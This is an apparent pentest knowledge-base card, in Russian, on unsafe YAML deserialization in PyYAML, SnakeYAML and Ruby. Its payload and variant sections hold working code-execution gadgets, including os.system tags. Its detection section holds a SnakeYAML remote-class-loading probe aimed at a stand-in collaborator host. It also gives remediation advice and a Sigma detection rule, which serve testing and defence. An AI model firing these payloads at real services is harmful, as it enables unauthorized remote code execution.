---
id: deserialization-yaml-unsafe-load
title: "YAML: unsafe load (PyYAML yaml.load, Ruby YAML.load, SnakeYAML)"
type: deserialization
target: yaml
category: web
difficulty: intermediate
bypass: none
tags: [deserialization, yaml, rce, config]
tested_on: ["PyYAML < 6 (yaml.load без Loader)", "SnakeYAML < 2.0", "Ruby Psych"]
success_rate: 0.5
risk: critical
cwe: "CWE-502"
lab: null
last_verified: "2026-10-23"
references:
  - "https://portswigger.net/web-security/deserialization"
graph:
  - target: "deserialization"
    type: instance_of
  - target: "rce"
    type: leads_to
  - target: "ci-cd"
    type: related_to
---

# YAML: unsafe load (PyYAML yaml.load, Ruby YAML.load, SnakeYAML)

!!! warning "Этика"
    Только лаборатории `hackbook` или системы с письменным разрешением на тестирование.

## Payload
```
# PyYAML: конструктор создаёт объект и вызывает его
!!python/object/apply:os.system ['id']
```

## Explanation

YAML — не «просто конфиг»: в нём есть теги создания объектов.
`yaml.load()` в PyYAML без явного `Loader=SafeLoader` исполняет
произвольные конструкторы (`!!python/object/apply`, `!!python/object/new`),
SnakeYAML до 2.0 десериализует любые классы (`!!javax.script.ScriptEngineManager`
с URL -> загрузка удалённого jar), Ruby `YAML.load` (Psych < 4) — то же.

Точки входа: загруженные пользователем YAML-конфиги (импорт настроек,
CI-пайплайны, Helm values, Ansible-переменные), сериализованные сессии,
API, принимающее `application/x-yaml`, вебхуки.

Опасность усиливается тем, что YAML воспринимают как «безопасный формат конфигов»,
поэтому проверки часто отсутствуют вовсе.

## Detection

1. Найдите точки приёма YAML (Content-Type, импорт конфигурации, CI).
2. Безопасная проба: `!!python/object/apply:os.getcwd []` (PyYAML) или
   `!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://collaborator/"]]]]`
   (SnakeYAML) — запрос к collaborator подтверждает десериализацию.
3. Статический анализ: `yaml.load(` без `Loader=SafeLoader`, `YAML.load`,
   `new Yaml().load(`, `Psych.load` (не `safe_load`).
4. В логах: `ConstructorError`, `could not determine a constructor for the tag` —
   значит, теги обрабатываются.
5. Зависимости: PyYAML < 5.4, SnakeYAML < 2.0, Psych < 4.

## Remediation

- PyYAML: только `yaml.safe_load()` / `yaml.load(stream, Loader=SafeLoader)`;
  PyYAML ≥ 6 делает `load` безопасным по умолчанию — обновитесь.
- SnakeYAML ≥ 2.0 (SafeConstructor по умолчанию) или явный
  `new Yaml(new SafeConstructor())`.
- Ruby: `YAML.safe_load(data, permitted_classes: [...])`, Psych ≥ 4.
- Валидация схемы конфига (JSON Schema/CUE) до применения; запрет тегов `!!`.
- Не принимать YAML от пользователей там, где подойдёт JSON.
- SAST-правила на unsafe-load; SCA для версий парсеров.
- Если YAML-конфиг приходит из CI — treat as code: ревью, подписи, изолированные раннеры.

## Variants

```
!!python/object/new:os.system ['id']
```

```
!!javax.script.ScriptEngineManager […]
```

```
!!ruby/object:Gem::Installer …
```

## Detection rules

```yaml
title: YAML unsafe load — python-теги (!!python/object) во входящем YAML
id: e5f6a7b8-0117-4e5f-9a7b-000000000117
status: experimental
description: >-
  Входящий YAML содержит теги !!python/object/apply, !!python/module —
  yaml.load() с небезопасным Loader выполнит произвольный код. Даже отказ
  безопасного лоадера (ConstructorError) фиксирует попытку.
references:
  - https://attack.mitre.org/techniques/T1190/
  - https://pyyaml.org/wiki/PyYAMLDocumentation
logsource:
  category: application
  definition: 'логи приложения с телом запроса и ошибками YAML-парсера'
detection:
  selection_body:
    request_body|contains:
      - '!!python/object'
      - '!!python/module'
      - '!!python/name'
      - '!!ruby/object'
      - '!!javax.script'
  selection_error:
    error_message|contains:
      - 'ConstructorError'
      - 'could not determine a constructor'
      - 'UnsafeLoader'
  condition: selection_body or selection_error
fields:
  - source_ip
  - request_path
  - request_body
  - error_message
falsepositives:
  - конфигурационные репозитории, где !!-теги легитимны (Ansible-подобные DSL) —
    исключайте внутренние источники конфигов
level: high
tags:
  - attack.initial_access
  - attack.t1190
  - cwe.502
```
